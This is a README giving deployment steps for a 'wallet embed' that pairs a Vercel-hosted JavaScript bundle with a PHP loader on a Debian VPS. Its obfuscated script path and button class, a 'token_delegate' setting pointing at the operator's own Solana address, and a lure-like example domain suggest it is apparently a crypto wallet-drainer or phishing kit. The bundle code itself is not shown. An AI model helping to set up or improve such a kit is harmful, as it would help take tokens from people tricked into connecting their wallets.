# Wallet embed — two folders

The project is split so deploy targets are obvious:

```
├── vercel/     → GitHub → Vercel (JavaScript bundle only)
└── vps/        → Debian VPS (HTML, PHP, secrets)
```

## Quick start

### 1. Vercel

See **[vercel/README.md](vercel/README.md)**

- Import repo on Vercel
- Set **Root Directory** to **`vercel`**
- Deploy → copy `https://YOUR-PROJECT.vercel.app/wallet.bundle.js`

### 2. Debian VPS

See **[vps/README.md](vps/README.md)**

- Upload `vps/` + configure nginx (`nginx/wallet-connect.conf`)
- `cp vps/config.example.php vps/config.php` and fill in values
- Set `vercel_bundle_url` to your Vercel bundle URL

### 3. HTML (on VPS)

```html
<script src="/vault38472" defer></script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

One tag. PHP serves config from `config.php` and pulls the JS from Vercel.

## What goes where

| | **vercel/** | **vps/** |
|---|-------------|----------|
| Reown project ID | — | `config.php` |
| Helius RPC / delegate | — | `config.php` |
| Wallet bundle | built on deploy | fetched by `loader.php` |
| User-facing HTML | — | `public/` |

Full VPS nginx/PHP setup: see sections below in this file.

---

## Debian VPS setup (step by step)

Fresh **Debian 12** VPS, sudo/root access, DNS **A record** for your domain → VPS IP.

### 1. Connect and update

```bash
ssh root@YOUR_VPS_IP
apt update && apt upgrade -y
```

### 2. Install nginx, PHP, Node.js, and git

```bash
apt install -y nginx php-fpm php-cli php-mbstring php-xml curl git
php -v
ls /run/php/   # note socket name, e.g. php8.2-fpm.sock
```

Node is optional on VPS if you use `vercel_bundle_url` only.

### 3. Put files on the VPS

Upload the **`vps/`** folder to `/var/www/mysite/vps` and **`nginx/wallet-connect.conf`** for your site.

You do **not** need the `vercel/` folder on the server.

### 4. config.php

```bash
cd /var/www/mysite/vps
cp config.example.php config.php
nano config.php
chmod 640 config.php
```

| Key | Example |
|-----|---------|
| `reown_project_id` | from Reown dashboard |
| `site_url` | `https://vote-moonshot.top` |
| `vercel_bundle_url` | `https://YOUR-PROJECT.vercel.app/wallet.bundle.js` |
| `token_delegate` | your Solana **address** (~44 chars) |
| `script_path` | `vault38472` |
| `button_class` | `K7mQ2` |

### 5. nginx

Use `nginx/wallet-connect.conf` — `location = /vault38472` → `loader.php`.

### 6. Reown dashboard

Allowed domains: your **HTML domain** (e.g. `vote-moonshot.top`), not `vercel.app`.

---

## Develop locally (optional)

```bash
cd vercel
npm install
npm run build
```

Produces `vercel/public/wallet.bundle.js`.
